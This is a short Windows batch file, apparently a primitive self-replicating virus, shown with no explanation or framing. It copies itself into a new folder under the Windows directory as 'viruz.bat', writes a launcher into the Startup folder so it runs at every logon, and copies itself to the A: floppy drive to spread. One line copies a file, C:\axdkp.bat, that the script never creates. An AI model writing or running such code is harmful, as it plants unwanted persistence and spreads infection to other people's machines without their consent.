@echo off
cd %windir%
md ųų
cd ųų
copy %0 viruz.bat
echo @echo off > C:\udf.bat
echo cd %windir% >> C:\udf.bat
echo cd ųų >> C:\udf.bat
echo viruz.bat >> C:\udf.bat
copy C:\udf.bat %windir%\Startm~1\Programs\StartUp\winst.bat
copy C:\axdkp.bat %windir%\startm~1\progra~1\autost~1\winst.bat
del C:\udf.bat
command /f /c copy %0 A:\
